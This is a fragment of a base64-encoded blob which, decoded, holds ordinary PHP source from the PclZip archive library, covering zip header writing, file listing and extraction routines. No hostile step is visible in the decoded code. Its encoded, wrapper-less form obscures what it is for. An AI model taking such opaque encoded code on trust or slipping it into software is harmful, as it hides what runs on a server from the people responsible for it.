3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2JpbmFyeV9kYXRhID0gQGZyZWFkKCR2X2ZpbGVfY29tcHJlc3NlZCwgMTApOw0KICAkdl9kYXRhX2hlYWRlciA9IHVucGFjaygnYTFpZDEvYTFpZDIvYTFjbS9hMWZsYWcvVm10aW1lL2ExeGZsL2Exb3MnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgJHZfZGF0YV9oZWFkZXJbJ29zJ10gPSBiaW4yaGV4KCR2X2RhdGFfaGVhZGVyWydvcyddKTsNCg0KICBAZnNlZWsoJHZfZmlsZV9jb21wcmVzc2VkLCBmaWxlc2l6ZSgkdl9nemlwX3RlbXBfbmFtZSktOCk7DQogICR2X2JpbmFyeV9kYXRhID0gQGZyZWFkKCR2X2ZpbGVfY29tcHJlc3NlZCwgOCk7DQogICR2X2RhdGFfZm9vdGVyID0gdW5wYWNrKCdWY3JjL1Zjb21wcmVzc2VkX3NpemUnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gb3JkKCR2X2RhdGFfaGVhZGVyWydjbSddKTsNCiAgJHBfaGVhZGVyWydjcmMnXSA9ICR2X2RhdGFfZm9vdGVyWydjcmMnXTsNCiAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9IGZpbGVzaXplKCR2X2d6aXBfdGVtcF9uYW1lKS0xODsNCg0KICBAZmNsb3NlKCR2X2ZpbGVfY29tcHJlc3NlZCk7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlRmlsZUhlYWRlcigkcF9oZWFkZXIpKSAhPSAxKSB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfZmlsZV9jb21wcmVzc2VkID0gQGZvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAicmIiKSkgPT0gMCkNCiAgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogIGZzZWVrKCR2X2ZpbGVfY29tcHJlc3NlZCwgMTApOw0KICAkdl9zaXplID0gJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHZfZmlsZV9jb21wcmVzc2VkLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHRoaXMtPnppcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgQGZjbG9zZSgkdl9maWxlX2NvbXByZXNzZWQpOw0KDQogIEB1bmxpbmsoJHZfZ3ppcF90ZW1wX25hbWUpOw0KICANCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkNhbGN1bGF0ZVN0b3JlZEZpbGVuYW1lKCYkcF9maWxlZGVzY3IsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgDQogICRwX2ZpbGVuYW1lID0gJHBfZmlsZWRlc2NyWydmaWxlbmFtZSddOw0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXSkpIHsNCiAgICAkcF9hZGRfZGlyID0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9hZGRfZGlyID0gJyc7DQogIH0NCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF0pKSB7DQogICAgJHBfcmVtb3ZlX2RpciA9ICRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF07DQogIH0NCiAgZWxzZSB7DQogICAgJHBfcmVtb3ZlX2RpciA9ICcnOw0KICB9DQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpIHsNCiAgICAkcF9yZW1vdmVfYWxsX2RpciA9ICRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEhdOw0KICB9DQogIGVsc2Ugew0KICAgICRwX3JlbW92ZV9hbGxfZGlyID0gMDsNCiAgfQ0KDQoNCiAgaWYgKGlzc2V0KCRwX2ZpbGVkZXNjclsnbmV3X2Z1bGxfbmFtZSddKSkgew0KICAgICR2X3N0b3JlZF9maWxlbmFtZSA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKCRwX2ZpbGVkZXNjclsnbmV3X2Z1bGxfbmFtZSddKTsNCiAgfQ0KICANCiAgZWxzZSB7DQoNCiAgICBpZiAoaXNzZXQoJHBfZmlsZWRlc2NyWyduZXdfc2hvcnRfbmFtZSddKSkgew0KICAgICAgJHZfcGF0aF9pbmZvID0gcGF0aGluZm8oJHBfZmlsZW5hbWUpOw0KICAgICAgJHZfZGlyID0gJyc7DQogICAgICBpZiAoJHZfcGF0aF9pbmZvWydkaXJuYW1lJ10gIT0gJycpIHsNCiAgICAgICAgJHZfZGlyID0gJHZfcGF0aF9pbmZvWydkaXJuYW1lJ10uJy8nOw0KICAgICAgfQ0KICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gJHZfZGlyLiRwX2ZpbGVkZXNjclsnbmV3X3Nob3J0X25hbWUnXTsNCiAgICB9DQogICAgZWxzZSB7DQogICAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSAkcF9maWxlbmFtZTsNCiAgICB9DQoNCiAgICBpZiAoJHBfcmVtb3ZlX2FsbF9kaXIpIHsNCiAgICAgICR2X3N0b3JlZF9maWxlbmFtZSA9IGJhc2VuYW1lKCRwX2ZpbGVuYW1lKTsNCiAgICB9DQogICAgZWxzZSBpZiAoJHBfcmVtb3ZlX2RpciAhPSAiIikgew0KICAgICAgaWYgKHN1YnN0cigkcF9yZW1vdmVfZGlyLCAtMSkgIT0gJy8nKQ0KICAgICAgICAkcF9yZW1vdmVfZGlyIC49ICIvIjsNCg0KICAgICAgaWYgKCAgIChzdWJzdHIoJHBfZmlsZW5hbWUsIDAsIDIpID09ICIuLyIpDQogICAgICAgICAgfHwgKHN1YnN0cigkcF9yZW1vdmVfZGlyLCAwLCAyKSA9PSAiLi8iKSkgew0KICAgICAgICAgIA0KICAgICAgICBpZiAoICAgKHN1YnN0cigkcF9maWxlbmFtZSwgMCwgMikgPT0gIi4vIikNCiAgICAgICAgICAgICYmIChzdWJzdHIoJHBfcmVtb3ZlX2RpciwgMCwgMikgIT0gIi4vIikpIHsNCiAgICAgICAgICAkcF9yZW1vdmVfZGlyID0gIi4vIi4kcF9yZW1vdmVfZGlyOw0KICAgICAgICB9DQogICAgICAgIGlmICggICAoc3Vic3RyKCRwX2ZpbGVuYW1lLCAwLCAyKSAhPSAiLi8iKQ0KICAgICAgICAgICAgJiYgKHN1YnN0cigkcF9yZW1vdmVfZGlyLCAwLCAyKSA9PSAiLi8iKSkgew0KICAgICAgICAgICRwX3JlbW92ZV9kaXIgPSBzdWJzdHIoJHBfcmVtb3ZlX2RpciwgMik7DQogICAgICAgIH0NCiAgICAgIH0NCg0KICAgICAgJHZfY29tcGFyZSA9IFBjbFppcFV0aWxQYXRoSW5jbHVzaW9uKCRwX3JlbW92ZV9kaXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lKTsNCiAgICAgIGlmICgkdl9jb21wYXJlID4gMCkgew0KICAgICAgICBpZiAoJHZfY29tcGFyZSA9PSAyKSB7DQogICAgICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gIiI7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gc3Vic3RyKCR2X3N0b3JlZF9maWxlbmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RybGVuKCRwX3JlbW92ZV9kaXIpKTsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgICANCiAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkdl9zdG9yZWRfZmlsZW5hbWUpOw0KICAgIA0KICAgIGlmICgkcF9hZGRfZGlyICE9ICIiKSB7DQogICAgICBpZiAoc3Vic3RyKCRwX2FkZF9kaXIsIC0xKSA9PSAiLyIpDQogICAgICAgICR2X3N0b3JlZF9maWxlbmFtZSA9ICRwX2FkZF9kaXIuJHZfc3RvcmVkX2ZpbGVuYW1lOw0KICAgICAgZWxzZQ0KICAgICAgICAkdl9zdG9yZWRfZmlsZW5hbWUgPSAkcF9hZGRfZGlyLiIvIi4kdl9zdG9yZWRfZmlsZW5hbWU7DQogICAgfQ0KICB9DQoNCiAgJHZfc3RvcmVkX2ZpbGVuYW1lID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHZfc3RvcmVkX2ZpbGVuYW1lKTsNCiAgJHBfZmlsZWRlc2NyWydzdG9yZWRfZmlsZW5hbWUnXSA9ICR2X3N0b3JlZF9maWxlbmFtZTsNCiAgDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZXcml0ZUZpbGVIZWFkZXIoJiRwX2hlYWRlcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHBfaGVhZGVyWydvZmZzZXQnXSA9IGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KDQogICR2X2RhdGUgPSBnZXRkYXRlKCRwX2hlYWRlclsnbXRpbWUnXSk7DQogICR2X210aW1lID0gKCR2X2RhdGVbJ2hvdXJzJ108PDExKSArICgkdl9kYXRlWydtaW51dGVzJ108PDUpICsgJHZfZGF0ZVsnc2Vjb25kcyddLzI7DQogICR2X21kYXRlID0gKCgkdl9kYXRlWyd5ZWFyJ10tMTk4MCk8PDkpICsgKCR2X2RhdGVbJ21vbiddPDw1KSArICR2X2RhdGVbJ21kYXknXTsNCg0KICAkdl9iaW5hcnlfZGF0YSA9IHBhY2soIlZ2dnZ2dlZWVnZ2IiwgMHgwNDAzNGI1MCwNCiAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10sICRwX2hlYWRlclsnZmxhZyddLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddLCAkdl9tdGltZSwgJHZfbWRhdGUsDQogICAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ2NyYyddLCAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddLA0KCQkJCQkgICRwX2hlYWRlclsnc2l6ZSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pLA0KCQkJCQkgICRwX2hlYWRlclsnZXh0cmFfbGVuJ10pOw0KDQogIGZwdXRzKCR0aGlzLT56aXBfZmQsICR2X2JpbmFyeV9kYXRhLCAzMCk7DQoNCiAgaWYgKHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSAhPSAwKQ0KICB7DQogICAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSwgc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pKTsNCiAgfQ0KICBpZiAoJHBfaGVhZGVyWydleHRyYV9sZW4nXSAhPSAwKQ0KICB7DQogICAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHBfaGVhZGVyWydleHRyYSddLCAkcF9oZWFkZXJbJ2V4dHJhX2xlbiddKTsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZXcml0ZUNlbnRyYWxGaWxlSGVhZGVyKCYkcF9oZWFkZXIpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X2RhdGUgPSBnZXRkYXRlKCRwX2hlYWRlclsnbXRpbWUnXSk7DQogICR2X210aW1lID0gKCR2X2RhdGVbJ2hvdXJzJ108PDExKSArICgkdl9kYXRlWydtaW51dGVzJ108PDUpICsgJHZfZGF0ZVsnc2Vjb25kcyddLzI7DQogICR2X21kYXRlID0gKCgkdl9kYXRlWyd5ZWFyJ10tMTk4MCk8PDkpICsgKCR2X2RhdGVbJ21vbiddPDw1KSArICR2X2RhdGVbJ21kYXknXTsNCg0KDQogICR2X2JpbmFyeV9kYXRhID0gcGFjaygiVnZ2dnZ2dlZWVnZ2dnZ2VlYiLCAweDAyMDE0YjUwLA0KICAgICAgICAgICAgICAgICAgICAgICRwX2hlYWRlclsndmVyc2lvbiddLCAkcF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10sDQogICAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ2ZsYWcnXSwgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddLA0KCQkJCQkgICR2X210aW1lLCAkdl9tZGF0ZSwgJHBfaGVhZGVyWydjcmMnXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10sICRwX2hlYWRlclsnc2l6ZSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pLA0KCQkJCQkgICRwX2hlYWRlclsnZXh0cmFfbGVuJ10sICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRwX2hlYWRlclsnZGlzayddLCAkcF9oZWFkZXJbJ2ludGVybmFsJ10sDQoJCQkJCSAgJHBfaGVhZGVyWydleHRlcm5hbCddLCAkcF9oZWFkZXJbJ29mZnNldCddKTsNCg0KICBmcHV0cygkdGhpcy0+emlwX2ZkLCAkdl9iaW5hcnlfZGF0YSwgNDYpOw0KDQogIGlmIChzdHJsZW4oJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkgIT0gMCkNCiAgew0KICAgIGZwdXRzKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10sIHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSk7DQogIH0NCiAgaWYgKCRwX2hlYWRlclsnZXh0cmFfbGVuJ10gIT0gMCkNCiAgew0KICAgIGZwdXRzKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnZXh0cmEnXSwgJHBfaGVhZGVyWydleHRyYV9sZW4nXSk7DQogIH0NCiAgaWYgKCRwX2hlYWRlclsnY29tbWVudF9sZW4nXSAhPSAwKQ0KICB7DQogICAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHBfaGVhZGVyWydjb21tZW50J10sICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2V3JpdGVDZW50cmFsSGVhZGVyKCRwX25iX2VudHJpZXMsICRwX3NpemUsICRwX29mZnNldCwgJHBfY29tbWVudCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBwYWNrKCJWdnZ2dlZWdiIsIDB4MDYwNTRiNTAsIDAsIDAsICRwX25iX2VudHJpZXMsDQogICAgICAgICAgICAgICAgICAgICAgJHBfbmJfZW50cmllcywgJHBfc2l6ZSwNCgkJCQkJICAkcF9vZmZzZXQsIHN0cmxlbigkcF9jb21tZW50KSk7DQoNCiAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHZfYmluYXJ5X2RhdGEsIDIyKTsNCg0KICBpZiAoc3RybGVuKCRwX2NvbW1lbnQpICE9IDApDQogIHsNCiAgICBmcHV0cygkdGhpcy0+emlwX2ZkLCAkcF9jb21tZW50LCBzdHJsZW4oJHBfY29tbWVudCkpOw0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkxpc3QoJiRwX2xpc3QpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RGlzYWJsZU1hZ2ljUXVvdGVzKCk7DQoNCiAgaWYgKCgkdGhpcy0+emlwX2ZkID0gQGZvcGVuKCR0aGlzLT56aXBuYW1lLCAncmInKSkgPT0gMCkNCiAgew0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgIA0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiBhcmNoaXZlIFwnJy4kdGhpcy0+emlwbmFtZS4nXCcgaW4gYmluYXJ5IHJlYWQgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9jZW50cmFsX2RpciA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2RpcikpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgQHJld2luZCgkdGhpcy0+emlwX2ZkKTsNCiAgaWYgKEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9jZW50cmFsX2Rpclsnb2Zmc2V0J10pKQ0KICB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAsICdJbnZhbGlkIGFyY2hpdmUgc2l6ZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICBmb3IgKCRpPTA7ICRpPCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ107ICRpKyspDQogIHsNCiAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZENlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcikpICE9IDEpDQogICAgew0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgIH0NCiAgICAkdl9oZWFkZXJbJ2luZGV4J10gPSAkaTsNCg0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXIsICRwX2xpc3RbJGldKTsNCiAgICB1bnNldCgkdl9oZWFkZXIpOw0KICB9DQoNCiAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfaGVhZGVyLCAmJHBfaW5mbykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfdGVtcF9wYXRoID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHBfaGVhZGVyWydmaWxlbmFtZSddKTsNCiAgJHBfaW5mb1snZmlsZW5hbWUnXSA9ICR2X3RlbXBfcGF0aDsNCiAgJHZfdGVtcF9wYXRoID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSk7DQogICRwX2luZm9bJ3N0b3JlZF9maWxlbmFtZSddID0gJHZfdGVtcF9wYXRoOw0KICAkcF9pbmZvWydzaXplJ10gPSAkcF9oZWFkZXJbJ3NpemUnXTsNCiAgJHBfaW5mb1snY29tcHJlc3NlZF9zaXplJ10gPSAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddOw0KICAkcF9pbmZvWydtdGltZSddID0gJHBfaGVhZGVyWydtdGltZSddOw0KICAkcF9pbmZvWydjb21tZW50J10gPSAkcF9oZWFkZXJbJ2NvbW1lbnQnXTsNCiAgJHBfaW5mb1snZm9sZGVyJ10gPSAoKCRwX2hlYWRlclsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCk7DQogICRwX2luZm9bJ2luZGV4J10gPSAkcF9oZWFkZXJbJ2luZGV4J107DQogICRwX2luZm9bJ3N0YXR1cyddID0gJHBfaGVhZGVyWydzdGF0dXMnXTsNCiAgJHBfaW5mb1snY3JjJ10gPSAkcF9oZWFkZXJbJ2NyYyddOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZFeHRyYWN0QnlSdWxlKCYkcF9maWxlX2xpc3QsICRwX3BhdGgsICRwX3JlbW92ZV9wYXRoLCAkcF9yZW1vdmVfYWxsX3BhdGgsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogIGlmICggICAoJHBfcGF0aCA9PSAiIikNCiAgICB8fCAoICAgKHN1YnN0cigkcF9wYXRoLCAwLCAxKSAhPSAiLyIpDQoJICAgICYmIChzdWJzdHIoJHBfcGF0aCwgMCwgMykgIT0gIi4uLyIpDQoJCSYmIChzdWJzdHIoJHBfcGF0aCwxLDIpIT0iOi8iKSkpDQogICAgJHBfcGF0aCA9ICIuLyIuJHBfcGF0aDsNCg0KICBpZiAoKCRwX3BhdGggIT0gIi4vIikgJiYgKCRwX3BhdGggIT0gIi8iKSkNCiAgew0KICAgIHdoaWxlIChzdWJzdHIoJHBfcGF0aCwgLTEpID09ICIvIikNCiAgICB7DQogICAgICAkcF9wYXRoID0gc3Vic3RyKCRwX3BhdGgsIDAsIHN0cmxlbigkcF9wYXRoKS0xKTsNCiAgICB9DQogIH0NCg0KICBpZiAoKCRwX3JlbW92ZV9wYXRoICE9ICIiKSAmJiAoc3Vic3RyKCRwX3JlbW92ZV9wYXRoLCAtMSkgIT0gJy8nKSkNCiAgew0KICAgICRwX3JlbW92ZV9wYXRoIC49ICcvJzsNCiAgfQ0KICAkcF9yZW1vdmVfcGF0aF9zaXplID0gc3RybGVuKCRwX3JlbW92ZV9wYXRoKTsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2T3BlbkZkKCdyYicpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X3Bvc19lbnRyeSA9ICR2X2NlbnRyYWxfZGlyWydvZmZzZXQnXTsNCg0KICAkal9zdGFydCA9IDA7DQogIGZvciAoJGk9MCwgJHZfbmJfZXh0cmFjdGVkPTA7ICRpPCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ107ICRpKyspDQogIHsNCg0KICAgIEByZXdpbmQoJHRoaXMtPnppcF9mZCk7DQogICAgaWYgKEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9wb3NfZW50cnkpKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCwgJ0ludmFsaWQgYXJjaGl2ZSBzaXplJyk7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICR2X2hlYWRlciA9IGFycmF5KCk7DQogICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRDZW50cmFsRmlsZUhlYWRlcigkdl9oZWFkZXIpKSAhPSAxKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgfQ0KDQogICAgJHZfaGVhZGVyWydpbmRleCddID0gJGk7DQoNCiAgICAkdl9wb3NfZW50cnkgPSBmdGVsbCgkdGhpcy0+emlwX2ZkKTsNCg0KICAgICR2X2V4dHJhY3QgPSBmYWxzZTsNCg0KICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdKSkNCiAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXSAhPSAwKSkgew0KDQogICAgICAgIGZvciAoJGo9MDsgKCRqPHNpemVvZigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV0pKSAmJiAoISR2X2V4dHJhY3QpOyAkaisrKSB7DQoNCiAgICAgICAgICAgIGlmIChzdWJzdHIoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSwgLTEpID09ICIvIikgew0KDQogICAgICAgICAgICAgICAgaWYgKCAgIChzdHJsZW4oJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkgPiBzdHJsZW4oJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkpDQogICAgICAgICAgICAgICAgICAgICYmIChzdWJzdHIoJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSwgMCwgc3RybGVuKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pKSA9PSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkgew0KICAgICAgICAgICAgICAgICAgICAkdl9leHRyYWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCR2X2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkgew0KICAgICAgICAgICAgICAgICR2X2V4dHJhY3QgPSB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQoNCiAgICBlbHNlIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX1BSRUddKSkNCiAgICAgICAgICAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX1BSRUddICE9ICIiKSkgew0KDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSwgJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkpIHsNCiAgICAgICAgICAgICR2X2V4dHJhY3QgPSB0cnVlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgZWxzZSBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF0pKQ0KICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdICE9IDApKSB7DQogICAgICAgIA0KICAgICAgICBmb3IgKCRqPSRqX3N0YXJ0OyAoJGo8c2l6ZW9mKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF0pKSAmJiAoISR2X2V4dHJhY3QpOyAkaisrKSB7DQoNCiAgICAgICAgICAgIGlmICgoJGk+PSRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydzdGFydCddKSAmJiAoJGk8PSRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydlbmQnXSkpIHsNCiAgICAgICAgICAgICAgICAkdl9leHRyYWN0ID0